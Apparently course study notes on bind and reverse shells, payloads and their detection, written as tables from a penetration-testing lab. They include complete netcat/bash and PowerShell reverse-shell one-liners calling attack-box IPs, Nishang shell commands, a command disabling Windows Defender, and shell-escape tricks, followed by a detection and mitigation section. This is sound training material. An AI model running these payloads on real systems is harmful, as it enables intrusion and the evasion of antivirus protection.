## Bind Shells

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Bind Shell|Target system has listener started and awaits connection from pentester's system (attack box)|
|Connection|Connect directly with IP address and port listening on target|
|Challenges|Listener must already be started on target; if not, need way to make it happen; strict incoming firewall rules + NAT/PAT on network edge → need to be on internal network; OS firewalls block most incoming connections not associated with trusted apps|
|Netcat (nc)|"Swiss-Army Knife" — functions over TCP, UDP, Unix sockets; IPv4/IPv6; opens/listens on sockets; proxy; text input/output|
|Role|Attack box = client; Target = server|
|**Practicing with GNU Netcat**||
|No. 1 — Server (Target)|`nc -lvnp 7777` → `Listening on [0.0.0.0] (family 0, port 7777)`|
|No. 2 — Client (Attack box)|`nc -nv 10.129.41.200 7777` → `Connection to 10.129.41.200 7777 port [tcp/*] succeeded!`|
|No. 3 — Server (Target)|`Connection from 10.10.14.117 51872 received!`|
|No. 4 — Client|`Hello Academy`|
|No. 5 — Server|`Hello Academy` received|
|Note|This is NOT a proper shell — just a Netcat TCP session; cannot interact with OS/file system; only passes text within pipe setup|
|**Establishing a Basic Bind Shell with Netcat**||
|No. 1 — Server (Binding Bash shell to TCP session)|`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f`|
|Note|Commands above = payload, delivered manually; payloads differ depending on host OS|
|No. 2 — Client (Connecting to bind shell)|`nc -nv 10.129.41.200 7777` → `Target@server:~$`|

## Reverse Shells

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Reverse Shell|Attack box has listener running; target initiates connection|
|Why preferred|Admin likely overlooks outbound connections → better chance of going undetected|
|Contrast with bind shell|Bind shell relies on incoming connections allowed through server-side firewall; harder to pull off in real-world|
|Mechanism|Start listener on attack box; use method (Unrestricted File Upload, Command Injection, etc.) to force target to initiate connection; attack box becomes server, target becomes client|
|Resource|Reverse Shell Cheat Sheet — list of commands, code, automated reverse shell generators|
|Caution|Admins aware of public repositories; may need to customize attacks|
|**Hands-on — Simple Reverse Shell in Windows**||
|Start listener|`sudo nc -lvnp 443` → `Listening on 0.0.0.0 443`|
|Port choice|443 (HTTPS) — common port; unlikely blocked outbound; deep packet inspection/Layer 7 may still detect reverse shell|
|RDP|Connect to Windows target using RDP|
|Netcat on Windows|Not native; may be unreliable; need to transfer binary; ideal to use native tools (living off the land)|
|Question|What applications and shell languages are hosted on target?|
|**PowerShell Reverse Shell One-liner**||
|Client (target)|`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`|
|Note|If using Pwnbox, some browsers have issues pasting into CLI; paste into Notepad on target first|
|**Windows Defender Block**||
|Error|`This script contains malicious content and has been blocked by your antivirus software.`|
|Disable AV|`Set-MpPreference -DisableRealtimeMonitoring $true` (administrative PowerShell console)|
|**Successful Connection**||
|Server (attack box)|`sudo nc -lvnp 443` → `Connection received on 10.129.36.68 49674`|
|Target prompt|`PS C:\Users\htb-student> whoami` → `ws01\htb-student`|
|Result|Successfully established reverse shell; prompt starts with `PS`; can interact with OS and file system|

# Payloads
## Introduction to Payloads

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Payload|Intended message; in infosec: command and/or code that exploits vulnerability in OS/application; performs malicious action from defensive perspective|
|Note|"Malware" and "malicious code" romanticize the process; explore what code & commands actually do|
|**Netcat/Bash Reverse Shell One-liner**||
|`rm -f /tmp/f;`|Remove `/tmp/f` if exists; `-f` ignores nonexistent files; `;` executes sequentially|
|`mkfifo /tmp/f;`|Make FIFO named pipe file at `/tmp/f`; `;` executes sequentially|
|`cat /tmp/f \|`|Concatenates FIFO named pipe; pipe (`\|`) connects stdout of cat to stdin of next command|
|`/bin/bash -i 2>&1 \|`|Specify command language interpreter with `-i` (interactive); `2>&1` redirects stderr (2) & stdout (1) to command following pipe|
|`nc 10.10.14.12 7777 > /tmp/f`|Netcat sends connection to attack host 10.10.14.12 port 7777; output redirected (`>`) to `/tmp/f`, serving Bash shell to waiting Netcat listener|
|**PowerShell One-liner Explained**||
|`powershell -nop -c`|Execute powershell.exe with no profile (`-nop`) and execute command/script block (`-c`) in quotes|
|`$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);`|Set `$client` equal to New-Object cmdlet creating instance of .NET `TCPClient`; connects with TCP socket in parentheses|
|`$stream = $client.GetStream();`|Set `$stream` equal to `$client` variable and .NET `GetStream` method for network communications|
|`[byte[]]$bytes = 0..65535\|%{0};`|Create byte type array `$bytes` returning 65,535 zeros; empty byte stream directed to TCP listener on attack box|
|`while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)`|While loop containing `$i` set equal to .NET `Stream.Read` method; parameters: buffer (`$bytes`), offset (0), count (`$bytes.Length`)|
|`{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);`|Set `$data` equal to ASCII encoding .NET class with `GetString` method to encode byte stream into ASCII|
|`$sendback = (iex $data 2>&1 \| Out-String );`|Set `$sendback` equal to `Invoke-Expression` (iex) against `$data`; redirect stderr (2>) & stdout (1) through pipe to `Out-String`; everything in `$data` runs on local computer|
|`$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';`|Set `$sendback2` equal to `$sendback` + string `PS ` + path to working directory + string `> `; shell prompt `PS C:\workingdirectory> `|
|`$sendbyte= ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}`|Set `$sendbyte` equal to ASCII encoded byte stream; TCP client initiates PowerShell session with Netcat listener on attack box|
|`$client.Close()`|`TcpClient.Close` method used when connection terminated|
|**PowerShell Script (.ps1) — Nishang**||
|`Invoke-PowerShellTcp`|Nishang script for Reverse or Bind interactive PowerShell from target|
|Reverse example|`Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444`|
|Bind example|`Invoke-PowerShellTcp -Bind -Port 4444`|
|IPv6 example|`Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444`|
|Derived from|Powerfun by Ben Turner & Dave Hardy|
|**Payloads Take Different Shapes and Forms**||
|Understanding|What payloads do helps understand why AV blocks execution and what to change to bypass restrictions|
|Determining factor|OS, shell interpreter languages, programming languages present on target|
|Not all one-liners|Some generated using automated attack frameworks (e.g., Metasploit) and deployed as pre-packaged/automated attack|

## Crafting Payloads with MSFvenom

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Purpose|Craft payloads when no direct network access to target; deliver via email, social engineering, etc.|
|Additional features|Encrypt & encode payloads to bypass common anti-virus detection signatures|
|**Listing Payloads**||
|`msfvenom -l payloads`|List all available payloads (592 total)|

## Spawning Interactive Shells

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|Context|Limited shell (jail shell) → need TTY bourne shell for more commands/prompt; Python may not be installed|
|Note|`/bin/sh` or `/bin/bash` can be replaced with binary associated with shell interpreter language present on system; most Linux systems have bourne shell (`/bin/sh`) and bourne again shell (`/bin/bash`)|
|**Methods to Spawn Interactive Shell**||
|`/bin/sh -i`|Execute shell interpreter in interactive mode (`-i`); `sh: no job control in this shell` → `sh-4.2$`|
|Perl|`perl -e 'exec "/bin/sh";'` — run from command line|
|Perl (script)|`perl: exec "/bin/sh";` — run from a script|
|Ruby (script)|`ruby: exec "/bin/sh"` — run from a script|
|Lua (script)|`lua: os.execute('/bin/sh')` — run from a script|
|AWK|`awk 'BEGIN {system("/bin/sh")}'` — C-like pattern scanning and processing language; present on most Unix/Linux systems|
|Find (with awk)|`find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` — searches for file, then executes awk to run shell|
|Find (with exec)|`find . -exec /bin/sh \; -quit` — uses `-exec` option to initiate shell directly; if file not found, no shell|
|VIM|`vim -c ':!/bin/sh'` — set shell interpreter from within VIM|
|VIM (escape)|`vim` → `:set shell=/bin/sh` → `:shell`|
|**Execution Permissions Considerations**||
|`ls -la <path/to/fileorbinary>`|List file properties and permissions account has over file/binary|
|`sudo -l`|Check sudo permissions; requires stable interactive shell; example: `(ALL : ALL) NOPASSWD: ALL` for apache on ILF-WebSrv|
|Purpose|See what commands can be executed; identify potential privilege escalation vectors|

# Detection & Prevention

|**Category**|**Details**|
|---|---|
|**Core Concepts**||
|MITRE ATT&CK Framework|"Globally-accessible knowledge base of adversary tactics and techniques based on real-world observations"|
|**Notable MITRE ATT&CK Tactics/Techniques**||
|Initial Access|Compromising public-facing host/service (web apps, misconfigured SMB/auth protocols, bugs in public-facing host); bastion host → foothold but not full access|
|Execution|Code supplied/planted by attacker running on victim; payloads, delivery methods, shell scripting; browser command execution, PowerShell one-liner via PsExec, public exploit/zero-day with Metasploit, uploading file via protocols|
|Command & Control (C2)|Culmination of efforts; gain access + mechanism for continued/interactive access; perform follow-on actions; standard ports/protocols (HTTP/S, DNS, NTP, Slack, Discord, MS Teams); varying sophistication (Netcat clear text → encrypted/obfuscated protocols, proxies, redirectors, VPNs)|
|**Events To Watch For**||
|File uploads|Common method of acquiring shell; watch application logs; firewalls/AV add layers; internet-exposed hosts should be hardened and monitored|
|Suspicious non-admin user actions|Normal users issuing Bash/cmd commands; `whoami`; SMB share connections not normal infrastructure share; enable logging (user interactions, PowerShell logging)|
|Anomalous network sessions|Pattern deviations; NetFlow data; top talkers, unique site visits, heartbeat on nonstandard port (4444 Meterpreter), remote login attempts, bulk GET/POST; network monitors, firewall logs, SIEMs|
|**Establish Network Visibility**||
|Documentation|Good practices for consistent visibility of devices, data, traffic flow; visual network topology diagrams|
|Tools|netbrain (combines visual diagraming, documentation, remote management); Draw.io|
|Layer 7 visibility|Cisco Meraki, Ubiquiti, Check Point, Palo Alto Networks; cloud-based network controllers with visual dashboards; baseline traffic usage, protocols, applications, inbound/outbound|
|Importance|If payload successfully executed, it must communicate over network → network visibility essential; deep packet inspection acts as anti-virus for network|
|**Example — Suspicious Traffic in Clear Text**||
|NetFlow observation|Frequent traffic on suspicious port (4444); basic TCP traffic|
|Wireshark capture|Source/destination IPs, protocol details, hex data|
|Follow TCP stream|Commands for directory listing and user creation (`net user`, `net localgroup`)|
|Detection|Command-line logging + NetFlow data → identify malicious actions; modern security appliance may detect, alert, prevent via deep packet inspection|
|**Protecting End Devices**||
|Examples|Workstations, servers, printers, NAS, cameras, smart TVs, smart speakers|
|Priority|Devices running OS with CLI that can be remotely accessed|
|Windows Defender|Present at install; leave enabled; Defender Firewall enabled with all profiles (Domain, Private, Public) on; exceptions only for approved applications via change management|
|Patch management|Ensure all hosts receive updates shortly after Microsoft releases them|
|AV on server|Can prevent payload execution and shell session establishment (though may slow performance)|
|**Potential Mitigations**||
|Application Sandboxing|Limit scope of access/damage if vulnerability/misconfiguration found|
|Least Privilege Permission Policies|Limit permissions; ordinary users don't need admin/domain admin access|
|Host Segmentation & Hardening|Harden hosts; segregate internet-exposed hosts; STIG hardening guides; DMZ/quarantine network segment|
|Physical and Application Layer Firewalls|Proper inbound/outbound rules; only allow traffic first established from within network on approved ports; deny inbound from prohibited IP space; NAT can break shell payload functionality|
|**Sum It All Up**||
|Approach|Defense-in-depth; strong security posture and defense strategy; hinder attackers; ensure low-hanging fruit cannot be easily taken advantage of|
